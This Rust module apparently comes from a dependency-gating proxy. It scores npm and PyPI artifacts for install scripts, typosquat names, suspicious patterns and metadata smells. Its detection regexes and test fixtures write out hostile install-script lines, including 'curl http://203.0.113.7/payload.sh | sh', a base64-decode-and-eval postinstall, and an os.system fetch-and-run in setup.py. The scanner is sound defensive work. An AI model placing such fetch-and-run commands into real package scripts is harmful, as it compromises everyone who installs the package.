//! Package-risk heuristics (`docs/v2-port/v2.1-depgate.md` §5) —
//! deterministic, native (no external tool/service dependency) OSS-style
//! checks run on a fetched npm/PyPI artifact's own metadata/bytes, ahead of
//! or alongside the ClamAV+YARA-X malware scan. Every check returns
//! [`RiskFinding`]s: *signals*, never verdicts — a heuristic hit alone must
//! never silently block a request; `crate::policy` is the only thing that
//! turns a finding into an `allow`/`warn`/`block`/`quarantine` decision.
//!
//! Four check families, matching the spec exactly:
//! - **install scripts** — npm `preinstall`/`install`/`postinstall` keys;
//!   PyPI `setup.py` presence (sdists only — wheels are pre-built and never
//!   run arbitrary code at install time).
//! - **typosquat distance** — [`typosquat::nearest_match`] against a small
//!   embedded list of well-known package names per ecosystem
//!   ([`NPM_POPULAR`]/[`PYPI_POPULAR`]), never an external API call.
//! - **suspicious patterns** — base64-decode-and-exec, obfuscated
//!   one-liners, network-exfil shell commands, embedded credentials —
//!   scanned inside npm script bodies and PyPI `setup.py` source.
//! - **metadata smells** — brand-new package published at an implausibly
//!   high version, no repository URL. ("Maintainer changed very recently"
//!   from the spec needs a *diff* against a prior snapshot this single-shot
//!   evaluator doesn't have — not implemented; see this module's tests for
//!   the two smells that are computable from one fetched document.)

use serde_json::Value;

/// How concerning a [`RiskFinding`] is. Ordered so `min_severity` policy-rule
/// matching (`crate::policy`) can compare with `>=`.
#[derive(
    Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, serde::Serialize, serde::Deserialize,
)]
#[serde(rename_all = "lowercase")]
pub enum Severity {
    /// Worth recording, not worth a human's attention on its own.
    Info,
    /// Common and usually benign (e.g. any install script at all).
    Low,
    /// Worth a reviewer's attention.
    Medium,
    /// Strong signal of malicious intent.
    High,
    /// Near-certain malicious intent (e.g. network-exfil + embedded creds
    /// together).
    Critical,
}

impl Severity {
    /// Canonical lowercase string, matching the DB `CHECK` constraint.
    #[must_use]
    pub const fn as_str(self) -> &'static str {
        match self {
            Severity::Info => "info",
            Severity::Low => "low",
            Severity::Medium => "medium",
            Severity::High => "high",
            Severity::Critical => "critical",
        }
    }
}

impl std::str::FromStr for Severity {
    type Err = String;

    fn from_str(s: &str) -> Result<Self, Self::Err> {
        match s {
            "info" => Ok(Severity::Info),
            "low" => Ok(Severity::Low),
            "medium" => Ok(Severity::Medium),
            "high" => Ok(Severity::High),
            "critical" => Ok(Severity::Critical),
            other => Err(format!("unrecognized severity: {other:?}")),
        }
    }
}

/// One heuristic hit: `check` is a stable machine-readable name (matches
/// `depgate_risk_findings.check_name` / `depgate_policy_rules.risk_check`),
/// `detail` is the human-readable "why".
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct RiskFinding {
    /// Stable check identifier (e.g. `"npm_install_script"`).
    pub check: String,
    /// Severity of this specific hit.
    pub severity: Severity,
    /// Human-readable explanation.
    pub detail: String,
}

impl RiskFinding {
    fn new(check: &str, severity: Severity, detail: impl Into<String>) -> Self {
        Self {
            check: check.to_owned(),
            severity,
            detail: detail.into(),
        }
    }
}

// -- suspicious script/source patterns --------------------------------

/// Scans one script/source body (an npm `scripts` value, or PyPI
/// `setup.py` source) for the "suspicious patterns" family: base64
/// decode-and-exec, obfuscated one-liners, network-exfil shell commands,
/// embedded credentials. `context` names the field this text came from
/// (e.g. `"postinstall"`, `"setup.py"`) for the finding's detail message.
fn scan_suspicious_patterns(context: &str, body: &str) -> Vec<RiskFinding> {
    let mut out = Vec::new();
    let lower = body.to_ascii_lowercase();

    let has_base64_marker = lower.contains("base64");
    let has_decode_call = lower.contains("-d")
        || lower.contains("--decode")
        || lower.contains("atob(")
        || lower.contains("b64decode")
        || lower.contains("frombase64string")
        || lower.contains("buffer.from(");
    let has_exec_sink = lower.contains("eval(")
        || lower.contains("exec(")
        || lower.contains("| sh")
        || lower.contains("|sh")
        || lower.contains("| bash")
        || lower.contains("|bash")
        || lower.contains("child_process")
        || lower.contains("new function(");
    if has_base64_marker && has_decode_call && has_exec_sink {
        out.push(RiskFinding::new(
            "suspicious_base64_exec",
            Severity::Critical,
            format!("{context}: base64-decode result appears to be executed"),
        ));
    }

    // Obfuscated one-liner: a single long line dense with eval/Function
    // machinery — the classic "one big minified/packed blob" shape used to
    // dodge naive string-search AV signatures.
    let longest_line = body.lines().map(str::len).max().unwrap_or(0);
    let has_obfuscation_marker =
        lower.contains("eval(") || lower.contains("new function(") || lower.contains("atob(");
    if longest_line > 300 && has_obfuscation_marker {
        out.push(RiskFinding::new(
            "suspicious_obfuscated_oneliner",
            Severity::High,
            format!("{context}: unusually long line ({longest_line} chars) combined with eval/Function/atob"),
        ));
    }

    if let Some(m) = NETWORK_EXFIL_RE.find(&lower) {
        out.push(RiskFinding::new(
            "suspicious_network_exfil",
            Severity::High,
            format!(
                "{context}: network fetch tool invoked against a raw host/IP ({:?})",
                m.as_str()
            ),
        ));
    }

    for (label, re) in CREDENTIAL_PATTERNS.iter() {
        if re.is_match(body) {
            out.push(RiskFinding::new(
                "suspicious_embedded_credential",
                Severity::Critical,
                format!("{context}: matched embedded-credential pattern {label:?}"),
            ));
        }
    }

    out
}

use std::sync::LazyLock;

use regex::Regex;

/// `curl`/`wget`/`nc` invoked against a bare IPv4 literal or an explicit
/// `http(s)://<host>` — the spec's "network exfil in install scripts"
/// pattern. Deliberately narrow (no domain-name matching, which would be
/// indistinguishable from a legitimate `curl https://registry.example.com`
/// download step) — a raw IP literal or scheme-qualified URL right next to
/// the fetch tool name is the actual exfil-shaped signal.
static NETWORK_EXFIL_RE: LazyLock<Regex> = LazyLock::new(|| {
    match Regex::new(
        r#"(curl|wget|nc)\s+\S*\s*(https?://[^\s'"]+|\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b)"#,
    ) {
        Ok(re) => re,
        Err(e) => unreachable!("static NETWORK_EXFIL_RE pattern is valid: {e}"),
    }
});

/// Named, lazily compiled embedded-credential patterns — a single
/// `LazyLock<Vec<_>>` rather than a `static` array of per-entry
/// `LazyLock<Regex>` fields, since a `static` cannot hold an interior-
/// mutable value (`LazyLock`) inside an aggregate literal's temporaries.
static CREDENTIAL_PATTERNS: LazyLock<Vec<(&'static str, Regex)>> = LazyLock::new(|| {
    vec![
        ("aws_access_key_id", regex_or_panic(r"\bAKIA[0-9A-Z]{16}\b")),
        (
            "github_token",
            regex_or_panic(r"\bgh[pousr]_[A-Za-z0-9]{20,}\b"),
        ),
        (
            "pem_private_key",
            regex_or_panic(r"-----BEGIN (RSA |EC |OPENSSH |)PRIVATE KEY-----"),
        ),
        (
            "generic_secret_assignment",
            regex_or_panic(
                r#"(?i)(password|secret|api[_-]?key|token)\s*[:=]\s*['"][^'"\s]{8,}['"]"#,
            ),
        ),
    ]
});

fn regex_or_panic(pattern: &str) -> Regex {
    match Regex::new(pattern) {
        Ok(re) => re,
        Err(e) => unreachable!("static credential pattern {pattern:?} is valid: {e}"),
    }
}

// -- typosquat distance ------------------------------------------------

/// Fuzzy name-similarity distance and popular-package matching.
pub mod typosquat {
    /// Optimal-String-Alignment (restricted Damerau-Levenshtein) edit
    /// distance: insertions, deletions, substitutions, and transpositions
    /// of adjacent characters, each costing 1 — the standard metric for
    /// "how many keystrokes/typos separate these two names", which is
    /// exactly the typosquat question. "Restricted" (vs. true
    /// Damerau-Levenshtein) means a transposed pair is never itself
    /// re-edited later in the same alignment; that distinction never
    /// matters for package-name-length strings and this avoids pulling in
    /// a dependency for the full algorithm.
    #[must_use]
    pub fn distance(a: &str, b: &str) -> usize {
        let a: Vec<char> = a.chars().collect();
        let b: Vec<char> = b.chars().collect();
        let (n, m) = (a.len(), b.len());
        if n == 0 {
            return m;
        }
        if m == 0 {
            return n;
        }
        let mut d = vec![vec![0usize; m + 1]; n + 1];
        for (i, row) in d.iter_mut().enumerate().take(n + 1) {
            row[0] = i;
        }
        if let Some(first_row) = d.first_mut() {
            for (j, cell) in first_row.iter_mut().enumerate() {
                *cell = j;
            }
        }
        for i in 1..=n {
            for j in 1..=m {
                let cost = usize::from(a[i - 1] != b[j - 1]);
                let mut v = (d[i - 1][j] + 1)
                    .min(d[i][j - 1] + 1)
                    .min(d[i - 1][j - 1] + cost);
                if i > 1 && j > 1 && a[i - 1] == b[j - 2] && a[i - 2] == b[j - 1] {
                    v = v.min(d[i - 2][j - 2] + 1);
                }
                d[i][j] = v;
            }
        }
        d[n][m]
    }

    /// Finds the closest name in `popular` (case-insensitive) that is
    /// within edit distance 2 of `name` and is not `name` itself —
    /// `Some((candidate, distance))` when found, `None` when `name` exactly
    /// matches a popular entry (it *is* the legitimate package) or nothing
    /// is close enough to be suspicious.
    #[must_use]
    pub fn nearest_match(name: &str, popular: &[&'static str]) -> Option<(&'static str, usize)> {
        let lname = name.to_ascii_lowercase();
        let mut best: Option<(&'static str, usize)> = None;
        for &candidate in popular {
            let lcand = candidate.to_ascii_lowercase();
            if lcand == lname {
                // Exact match (case-insensitive) — this IS the well-known
                // package, not an impersonation of it.
                return None;
            }
            let dist = distance(&lname, &lcand);
            if dist == 0 || dist > 2 {
                continue;
            }
            if best.is_none_or(|(_, best_dist)| dist < best_dist) {
                best = Some((candidate, dist));
            }
        }
        best
    }
}

/// A modest, embedded (never fetched over the network) list of well-known
/// npm package names — the typosquat-distance baseline for
/// [`evaluate_npm`]. Deliberately small: this is a heuristic tripwire for
/// "suspiciously close to something everyone installs", not an attempt at
/// exhaustive registry coverage.
pub const NPM_POPULAR: &[&str] = &[
    "react",
    "react-dom",
    "vue",
    "angular",
    "lodash",
    "express",
    "axios",
    "moment",
    "chalk",
    "commander",
    "debug",
    "webpack",
    "babel-core",
    "typescript",
    "eslint",
    "jest",
    "mocha",
    "chai",
    "async",
    "request",
    "underscore",
    "jquery",
    "bootstrap",
    "next",
    "redux",
    "react-redux",
    "rxjs",
    "socket.io",
    "ws",
    "uuid",
    "yargs",
    "dotenv",
    "cors",
    "body-parser",
    "mongoose",
    "sequelize",
    "prisma",
    "graphql",
    "apollo-server",
    "nodemon",
    "prettier",
    "tailwindcss",
    "vite",
    "rollup",
    "esbuild",
    "jsonwebtoken",
    "bcrypt",
    "passport",
    "multer",
    "sharp",
    "node-fetch",
    "form-data",
    "qs",
    "semver",
    "glob",
    "minimist",
    "colors",
    "figlet",
    "inquirer",
    "ora",
    "left-pad",
    "is-array",
    "classnames",
    "styled-components",
    "immer",
    "zod",
    "yup",
    "date-fns",
    "luxon",
    "winston",
    "pino",
    "helmet",
    "morgan",
    "cookie-parser",
];

/// Same idea as [`NPM_POPULAR`], for PyPI project names.
pub const PYPI_POPULAR: &[&str] = &[
    "requests",
    "numpy",
    "pandas",
    "flask",
    "django",
    "fastapi",
    "pytest",
    "pyyaml",
    "boto3",
    "click",
    "sqlalchemy",
    "pillow",
    "cryptography",
    "urllib3",
    "certifi",
    "setuptools",
    "pip",
    "wheel",
    "six",
    "packaging",
    "jinja2",
    "markupsafe",
    "attrs",
    "idna",
    "charset-normalizer",
    "python-dateutil",
    "pytz",
    "typing-extensions",
    "aiohttp",
    "httpx",
    "starlette",
    "uvicorn",
    "gunicorn",
    "celery",
    "redis",
    "psycopg2",
    "pymongo",
    "scipy",
    "scikit-learn",
    "torch",
    "tensorflow",
    "matplotlib",
    "seaborn",
    "beautifulsoup4",
    "lxml",
    "scrapy",
    "selenium",
    "paramiko",
    "fabric",
    "invoke",
    "pydantic",
    "marshmallow",
    "black",
    "flake8",
    "mypy",
    "tox",
    "coverage",
    "sphinx",
    "twine",
    "wheel",
    "virtualenv",
    "pipenv",
    "poetry",
];

// -- ecosystem dispatch --------------------------------------------------

/// Runs the appropriate ecosystem evaluator for one ingested artifact —
/// `crate::scanpipe::ScanPipeline::ingest`'s single entry point into this
/// module, so the shared ingest path stays ecosystem-agnostic. `name`/
/// `reference` are exactly `ingest`'s own parameters: for npm, `name` is
/// the real package name and `reference` is the tarball filename; for
/// PyPI, `name` is the upstream-relative file path (no project name is
/// available at that layer — see `crate::routes::pypi` module docs) and
/// `reference` is the filename, which is what [`evaluate_pypi`] actually
/// needs. OCI has no install-script/typosquat model at this layer (image
/// layers, not source packages) and always yields no findings.
#[must_use]
pub fn evaluate(ecosystem: &str, name: &str, reference: &str, bytes: &[u8]) -> Vec<RiskFinding> {
    match ecosystem {
        "npm" => evaluate_npm(name, bytes),
        "pypi" => evaluate_pypi(reference, bytes, None),
        _ => Vec::new(),
    }
}

// -- npm: install scripts + metadata smells -----------------------------

const NPM_INSTALL_SCRIPT_KEYS: [&str; 3] = ["preinstall", "install", "postinstall"];

/// Evaluates one npm tarball. Reads `package/package.json` straight out of
/// the fetched `.tgz` bytes via `crate::tarutil` rather than trusting the
/// registry packument's own copy of the same fields — checking what is
/// actually inside the artifact being cached is strictly more correct than
/// trusting separately-served metadata that could in principle drift from
/// it, and it means this check needs no extra upstream fetch: the tarball
/// bytes `ingest` already has in hand are the only input required.
/// `package/` is npm's fixed packaging convention (every `npm pack`/publish
/// tarball roots its contents under a directory literally named
/// `package`), so this looks for that exact path rather than a bare
/// `package.json` suffix, which could otherwise match a bundled
/// dependency's nested manifest instead of the package's own.
#[must_use]
pub fn evaluate_npm(name: &str, tarball_bytes: &[u8]) -> Vec<RiskFinding> {
    let mut findings = Vec::new();

    if let Some(popular_match) = typosquat::nearest_match(name, NPM_POPULAR) {
        findings.push(RiskFinding::new(
            "typosquat_distance",
            if popular_match.1 == 1 {
                Severity::High
            } else {
                Severity::Medium
            },
            format!(
                "{name:?} is edit-distance {} from popular package {:?}",
                popular_match.1, popular_match.0
            ),
        ));
    }

    let Some(pkg_json) =
        crate::tarutil::find_gzip_tar_entry_ending_with(tarball_bytes, "package/package.json")
    else {
        // Not a well-formed npm tarball (or genuinely missing a manifest at
        // the conventional path) — nothing further to check.
        return findings;
    };
    let Ok(meta) = serde_json::from_slice::<Value>(&pkg_json) else {
        return findings;
    };

    if let Some(scripts) = meta.get("scripts").and_then(Value::as_object) {
        for key in NPM_INSTALL_SCRIPT_KEYS {
            let Some(body) = scripts.get(key).and_then(Value::as_str) else {
                continue;
            };
            findings.push(RiskFinding::new(
                "npm_install_script",
                Severity::Low,
                format!("package.json defines a {key:?} script: {body:?}"),
            ));
            findings.extend(scan_suspicious_patterns(key, body));
        }
    }

    if meta.get("repository").is_none() {
        findings.push(RiskFinding::new(
            "metadata_no_repository",
            Severity::Info,
            "package.json has no repository field".to_owned(),
        ));
    }

    findings
}

// -- pypi: setup.py presence + metadata smells --------------------------

/// Recovers the project name from a wheel/sdist filename (`{name}-
/// {version}-...` per PEP 427/440), by taking every leading
/// hyphen-separated token up to (not including) the first token that looks
/// like the start of a version number. Best-effort: PyPI project names
/// themselves may contain hyphens (`python-dateutil`), and this heuristic
/// only feeds a fuzzy typosquat-distance check, not an exact-identity
/// decision, so an imperfect split is an acceptable tradeoff against
/// writing/depending on a full PEP 440 version-string parser for it.
fn project_name_from_filename(filename: &str) -> String {
    let stem = filename
        .strip_suffix(".tar.gz")
        .or_else(|| filename.strip_suffix(".tgz"))
        .or_else(|| filename.strip_suffix(".whl"))
        .or_else(|| filename.strip_suffix(".zip"))
        .unwrap_or(filename);
    let looks_like_version_start =
        |tok: &str| tok.chars().next().is_some_and(|c| c.is_ascii_digit());
    let name_tokens: Vec<&str> = stem
        .split('-')
        .take_while(|tok| !looks_like_version_start(tok))
        .collect();
    if name_tokens.is_empty() {
        stem.to_owned()
    } else {
        name_tokens.join("-")
    }
}

/// Evaluates one PyPI release file. `filename`/`bytes` are the fetched
/// artifact itself; `project_meta` is the optional legacy JSON API document
/// (`crate::pypi::PypiUpstreamClient::fetch_json_api`) — `None` on the hot
/// serve path (`crate::routes::pypi::package_file` never fetches metadata
/// just to serve a file byte-for-byte), `Some` from the seed warm-start
/// path, which already holds it. Metadata-smell checks are skipped
/// (nothing to evaluate) when `None`.
#[must_use]
pub fn evaluate_pypi(
    filename: &str,
    bytes: &[u8],
    project_meta: Option<&Value>,
) -> Vec<RiskFinding> {
    let mut findings = Vec::new();
    let name = project_name_from_filename(filename);

    if let Some(popular_match) = typosquat::nearest_match(&name, PYPI_POPULAR) {
        findings.push(RiskFinding::new(
            "typosquat_distance",
            if popular_match.1 == 1 {
                Severity::High
            } else {
                Severity::Medium
            },
            format!(
                "{name:?} is edit-distance {} from popular package {:?}",
                popular_match.1, popular_match.0
            ),
        ));
    }

    // setup.py only exists in sdists (.tar.gz/.tar.bz2/.zip source
    // distributions) — wheels (.whl) are pre-built and never execute
    // arbitrary code at install time, so there is nothing to check there.
    let is_sdist = filename.ends_with(".tar.gz") || filename.ends_with(".tgz");
    if is_sdist
        && let Some(source) = crate::tarutil::find_gzip_tar_entry_ending_with(bytes, "setup.py")
    {
        let text = String::from_utf8_lossy(&source);
        findings.push(RiskFinding::new(
            "pypi_setup_py_present",
            Severity::Low,
            "sdist contains a setup.py (executes at install time)".to_owned(),
        ));
        findings.extend(scan_suspicious_patterns("setup.py", &text));
        if PY_EXEC_HINT_RE.is_match(&text) {
            findings.push(RiskFinding::new(
                "pypi_setup_py_executes_code",
                Severity::Medium,
                "setup.py invokes a process/network/eval primitive outside plain setuptools.setup(...)".to_owned(),
            ));
        }
    }

    if let Some(meta) = project_meta {
        let has_repo = meta
            .pointer("/info/project_urls")
            .and_then(Value::as_object)
            .is_some_and(|urls| !urls.is_empty())
            || meta
                .pointer("/info/home_page")
                .and_then(Value::as_str)
                .is_some_and(|s| !s.is_empty());
        if !has_repo {
            findings.push(RiskFinding::new(
                "metadata_no_repository",
                Severity::Info,
                "project metadata has no home_page/project_urls".to_owned(),
            ));
        }
        let release_count = meta
            .get("releases")
            .and_then(Value::as_object)
            .map_or(0, serde_json::Map::len);
        if release_count <= 1
            && let Some(version) = meta.pointer("/info/version").and_then(Value::as_str)
            && version
                .split('.')
                .next()
                .and_then(|major| major.parse::<u64>().ok())
                .is_some_and(|major| major >= 2)
        {
            findings.push(RiskFinding::new(
                "metadata_new_package_high_version",
                Severity::Medium,
                format!("sole published release is already version {version:?}"),
            ));
        }
    }

    findings
}

/// Matches process/network/eval primitives a plain, static
/// `setuptools.setup(...)` call never needs — the "executable code" half of
/// the spec's "setup.py presence with executable code" check.
static PY_EXEC_HINT_RE: LazyLock<Regex> = LazyLock::new(|| {
    regex_or_panic(
        r"\b(os\.system|subprocess\.|eval\(|exec\(|socket\.socket|urllib\.request|__import__)\b",
    )
});

#[cfg(test)]
#[allow(clippy::expect_used, clippy::panic)] // tests fail loudly by design
mod tests {
    use super::*;

    #[test]
    fn severity_round_trips() {
        for s in [
            Severity::Info,
            Severity::Low,
            Severity::Medium,
            Severity::High,
            Severity::Critical,
        ] {
            assert_eq!(s.as_str().parse::<Severity>().expect("round trip"), s);
        }
        assert!("bogus".parse::<Severity>().is_err());
    }

    #[test]
    fn severity_orders_low_to_critical() {
        assert!(Severity::Info < Severity::Low);
        assert!(Severity::Low < Severity::Medium);
        assert!(Severity::Medium < Severity::High);
        assert!(Severity::High < Severity::Critical);
    }

    #[test]
    fn distance_zero_for_identical_strings() {
        assert_eq!(typosquat::distance("lodash", "lodash"), 0);
    }

    #[test]
    fn distance_handles_substitution_insertion_deletion_and_transposition() {
        assert_eq!(typosquat::distance("kitten", "sitting"), 3);
        assert_eq!(typosquat::distance("react", "reactt"), 1);
        assert_eq!(typosquat::distance("react", "reac"), 1);
        assert_eq!(typosquat::distance("react", "raect"), 1); // transposition
    }

    #[test]
    fn nearest_match_flags_a_close_typosquat() {
        let got = typosquat::nearest_match("expres", NPM_POPULAR).expect("should match express");
        assert_eq!(got.0, "express");
        assert_eq!(got.1, 1);
    }

    #[test]
    fn nearest_match_ignores_the_exact_legitimate_name() {
        assert_eq!(typosquat::nearest_match("express", NPM_POPULAR), None);
        assert_eq!(typosquat::nearest_match("EXPRESS", NPM_POPULAR), None);
    }

    #[test]
    fn nearest_match_ignores_unrelated_names() {
        assert_eq!(
            typosquat::nearest_match("my-totally-unrelated-package", NPM_POPULAR),
            None
        );
    }

    fn make_npm_tarball(package_json: &serde_json::Value) -> Vec<u8> {
        let body = serde_json::to_vec(package_json).expect("serialize package.json");
        crate::tarutil::tests::build_gzip_tar(&[("package/package.json", &body)])
    }

    #[test]
    fn evaluate_npm_flags_install_scripts() {
        let meta = serde_json::json!({
            "scripts": {"postinstall": "node ./build.js"},
            "repository": {"type": "git", "url": "https://example.com/repo.git"},
        });
        let tarball = make_npm_tarball(&meta);
        let findings = evaluate_npm("some-safe-pkg", &tarball);
        assert!(
            findings
                .iter()
                .any(|f| f.check == "npm_install_script" && f.severity == Severity::Low)
        );
    }

    #[test]
    fn evaluate_npm_flags_base64_exec_in_install_script() {
        let meta = serde_json::json!({
            "scripts": {"postinstall": "node -e \"eval(Buffer.from(process.env.P,'base64').toString())\""},
        });
        let tarball = make_npm_tarball(&meta);
        let findings = evaluate_npm("some-pkg", &tarball);
        assert!(findings.iter().any(|f| f.check == "suspicious_base64_exec"));
    }

    #[test]
    fn evaluate_npm_flags_network_exfil_in_install_script() {
        let meta = serde_json::json!({
            "scripts": {"install": "curl http://203.0.113.7/payload.sh | sh"},
        });
        let tarball = make_npm_tarball(&meta);
        let findings = evaluate_npm("some-pkg", &tarball);
        assert!(
            findings
                .iter()
                .any(|f| f.check == "suspicious_network_exfil")
        );
    }

    #[test]
    fn evaluate_npm_flags_embedded_aws_key() {
        let meta = serde_json::json!({
            "scripts": {"install": "echo AKIAIOSFODNN7EXAMPLE >> /tmp/leak"},
        });
        let tarball = make_npm_tarball(&meta);
        let findings = evaluate_npm("some-pkg", &tarball);
        assert!(
            findings
                .iter()
                .any(|f| f.check == "suspicious_embedded_credential")
        );
    }

    #[test]
    fn evaluate_npm_flags_missing_repository() {
        let tarball = make_npm_tarball(&serde_json::json!({}));
        let findings = evaluate_npm("some-pkg", &tarball);
        assert!(findings.iter().any(|f| f.check == "metadata_no_repository"));
    }

    #[test]
    fn evaluate_npm_clean_package_has_no_findings() {
        let meta = serde_json::json!({
            "repository": {"type": "git", "url": "https://example.com/repo.git"},
        });
        let tarball = make_npm_tarball(&meta);
        assert!(evaluate_npm("totally-unique-safe-name", &tarball).is_empty());
    }

    #[test]
    fn evaluate_npm_tolerates_a_tarball_with_no_package_json() {
        let tarball = crate::tarutil::tests::build_gzip_tar(&[("package/README.md", b"hi")]);
        // No install-script/repository findings possible without a
        // manifest, but the typosquat check (name-only) still runs.
        assert!(evaluate_npm("totally-unique-safe-name", &tarball).is_empty());
    }

    #[test]
    fn evaluate_dispatches_by_ecosystem() {
        let meta = serde_json::json!({"scripts": {"install": "echo hi"}});
        let npm_tarball = make_npm_tarball(&meta);
        assert!(!evaluate("npm", "some-pkg", "some-pkg-1.0.0.tgz", &npm_tarball).is_empty());

        let sdist = make_sdist_with_setup_py(b"from setuptools import setup\nsetup()\n");
        assert!(!evaluate("pypi", "aa/bb/pkg-1.0.0.tar.gz", "pkg-1.0.0.tar.gz", &sdist).is_empty());

        assert!(evaluate("oci", "library/nginx", "latest", b"irrelevant").is_empty());
    }

    fn make_sdist_with_setup_py(setup_py_source: &[u8]) -> Vec<u8> {
        crate::tarutil::tests::build_gzip_tar(&[("pkg-1.0.0/setup.py", setup_py_source)])
    }

    #[test]
    fn project_name_from_filename_strips_version_and_extension() {
        assert_eq!(
            project_name_from_filename("requests-2.34.2.tar.gz"),
            "requests"
        );
        assert_eq!(
            project_name_from_filename("python-dateutil-2.8.2.tar.gz"),
            "python-dateutil"
        );
        assert_eq!(
            project_name_from_filename("pkg-1.0.0-py3-none-any.whl"),
            "pkg"
        );
    }

    #[test]
    fn evaluate_pypi_flags_setup_py_presence() {
        let bytes = make_sdist_with_setup_py(b"from setuptools import setup\nsetup(name='pkg')\n");
        let findings = evaluate_pypi("safe-pkg-1.0.0.tar.gz", &bytes, None);
        assert!(findings.iter().any(|f| f.check == "pypi_setup_py_present"));
        assert!(
            !findings
                .iter()
                .any(|f| f.check == "pypi_setup_py_executes_code")
        );
    }

    #[test]
    fn evaluate_pypi_flags_executable_setup_py() {
        let bytes =
            make_sdist_with_setup_py(b"import os\nos.system('curl http://203.0.113.9/x | sh')\n");
        let findings = evaluate_pypi("safe-pkg-1.0.0.tar.gz", &bytes, None);
        assert!(
            findings
                .iter()
                .any(|f| f.check == "pypi_setup_py_executes_code")
        );
        assert!(
            findings
                .iter()
                .any(|f| f.check == "suspicious_network_exfil")
        );
    }

    #[test]
    fn evaluate_pypi_wheel_skips_setup_py_check_entirely() {
        let bytes = b"not a real wheel but bytes are irrelevant for this check".to_vec();
        let findings = evaluate_pypi("safe-pkg-1.0.0-py3-none-any.whl", &bytes, None);
        assert!(
            !findings
                .iter()
                .any(|f| f.check.starts_with("pypi_setup_py"))
        );
    }

    #[test]
    fn evaluate_pypi_flags_metadata_smells_when_project_meta_provided() {
        let bytes = make_sdist_with_setup_py(b"from setuptools import setup\nsetup()\n");
        let meta = serde_json::json!({
            "info": {"version": "3.0.0", "project_urls": {}, "home_page": ""},
            "releases": {"3.0.0": []},
        });
        let findings = evaluate_pypi("safe-pkg-3.0.0.tar.gz", &bytes, Some(&meta));
        assert!(findings.iter().any(|f| f.check == "metadata_no_repository"));
        assert!(
            findings
                .iter()
                .any(|f| f.check == "metadata_new_package_high_version")
        );
    }

    #[test]
    fn evaluate_pypi_skips_metadata_smells_when_project_meta_absent() {
        let bytes = make_sdist_with_setup_py(b"from setuptools import setup\nsetup()\n");
        let findings = evaluate_pypi("safe-pkg-3.0.0.tar.gz", &bytes, None);
        assert!(!findings.iter().any(|f| f.check.starts_with("metadata_")));
    }
}
